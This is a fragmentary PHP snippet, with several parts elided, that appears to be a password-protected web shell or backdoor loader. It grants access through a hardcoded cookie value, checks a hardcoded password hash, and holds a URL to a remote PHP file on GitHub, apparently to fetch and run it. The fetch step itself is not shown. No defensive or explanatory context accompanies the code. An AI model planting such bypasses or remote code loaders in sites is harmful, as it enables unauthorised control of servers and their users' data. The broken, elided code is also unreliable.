...
{
    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'admin@0xSHALLBYP@22'; 
}
...
if (is_logged_in()) {
    ...
    $destiny = 'https://raw.githubusercontent.com/ahmadMM1/hello-world/refs/heads/master/nanokash.php';
    ...
    if (isset($_POST['password'])) {
        ...
        $hashed_key = '$2y$12$qYJ2JJEEUsImdFZGKmaO4ebOjIwd966rxMcN7woiFTnJB/iqenzYS';
        
        if (password_verify($entered_key, $hashed_key)) {
            setcookie('user_id', 'admin@0xSHALLBYP@22', time() + 3600, '/'); 
